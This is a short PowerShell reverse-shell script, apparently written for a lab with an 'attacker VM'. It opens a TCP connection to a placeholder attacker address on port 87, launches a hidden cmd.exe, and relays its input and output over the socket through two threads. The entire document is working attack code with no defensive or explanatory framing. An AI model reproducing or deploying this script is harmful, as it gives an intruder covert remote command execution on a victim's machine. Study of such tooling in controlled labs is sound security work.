# Define the IP address and port of your attacker VM
$AttackerIPAddress = "attackerVMIpAddress"
$AttackerPort = 87

# Create a TCP client object and connect to the attacker VM
$Client = New-Object System.Net.Sockets.TcpClient($AttackerIPAddress, $AttackerPort)
$Stream = $Client.GetStream()
$Reader = New-Object System.IO.StreamReader($Stream)
$Writer = New-Object System.IO.StreamWriter($Stream)

# Start a shell process and redirect input/output to the TCP client stream
$Process = New-Object System.Diagnostics.Process
$Process.StartInfo.FileName = "cmd.exe"
$Process.StartInfo.UseShellExecute = $false
$Process.StartInfo.RedirectStandardInput = $true
$Process.StartInfo.RedirectStandardOutput = $true
$Process.StartInfo.CreateNoWindow = $true
$Process.Start()

# Create separate threads to handle input/output redirection
$StreamReaderThread = [System.Threading.Thread]::new({
    while ($true) {
        $Output = $Process.StandardOutput.ReadLine()
        $Writer.WriteLine($Output)
        $Writer.Flush()
    }
})

$StreamWriterThread = [System.Threading.Thread]::new({
    while ($true) {
        $Input = $Reader.ReadLine()
        $Process.StandardInput.WriteLine($Input)
        $Process.StandardInput.Flush()
    }
})

# Start the threads
$StreamReaderThread.Start()
$StreamWriterThread.Start()

# Wait for the threads to complete (never)
$StreamReaderThread.Join()
$StreamWriterThread.Join()
